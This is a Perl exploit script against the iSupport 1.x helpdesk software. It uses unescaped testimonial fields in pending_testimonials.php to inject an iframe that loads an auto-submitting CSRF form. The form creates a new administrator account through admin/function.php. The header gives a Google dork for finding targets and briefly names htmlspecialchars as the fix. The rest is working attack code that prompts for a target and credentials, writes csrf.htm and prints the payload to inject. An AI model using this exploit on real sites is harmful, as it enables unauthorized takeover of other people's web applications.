#!/usr/bin/perl
########################################################################
# Title    : iSupport v1.x => Html Code injection to add admin
# Author   : Or4nG.M4n
# Version  : 1.x
# Homepage : http://www.idevspot.com/iSupport.php
# Google Dork: "Powered by [ iSupport 1.8 ]"
# Homepage : http://www.idevspot.com/
# Thnks :
# +----------------------------------+
# |   xSs m4n   i-Hmx   h311 c0d3    |
# |   Dr.Bnned ahwak2000 sa^Dev!L    |
# +----------------------------------+
#                       html injection to add Admin
# vuln : pending_testimonials.php
#
#      <tr bgcolor="#F9F9F9"> 
#	<td width="100%"> <b> 
#	 <?php echo $title;?>
#	 </b> <i>posted by</i> <b> 
#	 <?php echo $name;?>
#	 </b> [ <a href="<?php echo $website; ?>" target="_blank"><b>Website</b></a> ] <br>
#	 <i> 
#	 <?php echo $body; ?>
#	 </i></td>
#	<td> 
# How i can Fixed ..
# in all vuln file 
# Replace : echo $website; echo $title; echo $body; => Replace with => echo htmlspecialchars($website); like this ..
# Thnks to All Stupid Coders  

system("cls");
print 
"
+----------------------------------------+\n
| iSupport 1.x inject html to Add Admin  |\n
|  Or4nG.M4n  sA^Dev!L  xSs m4n  i-Hmx   |\n
+----------------------------------------+\n
Loading ...\n
";
sleep(3);
print "tragt & path #";
$h = <STDIN>;
chomp $h;
print "User #";
$user = <STDIN>;
chomp $user;
print "Mail #";
$mail = <STDIN>;
chomp $mail;
print "Pass #";
$pass = <STDIN>;
chomp $pass;
$html = '<form name="xss" method="post" action= "'.$h.'/admin/function.php?which=ADMINISTRATORS&return=administrators&id=&t1=NAME&t2=EMAIL&t3=PASSWORD">
<input type="text" name="1" value="'.$user.'" size="30">
<input type="text" name="2" value="'.$mail.'" size="30">
<input type="text" name="3" value="'.$pass.'" size="30">
<script>document.xss.submit();</script>
</form>';
sleep(2);
print "Createing ...\n";
open(XSS , '>>csrf.htm');
print XSS $html;
close(XSS);
print "Createing Done .. \n";
sleep(2);
print "Plz UPLOAD csrf.htm to your Site and Put's Url h3r3 #";
$csrf = <STDIN>;
chomp $csrf;
$done = '<iframe id="iframe" src="'.$csrf.'" width="777" height="678"></iframe>';
sleep(2);
print "NOW INJECT This Code \n";
print $done."\n";
print "";
print "\n Enjoy .. ";

# The End
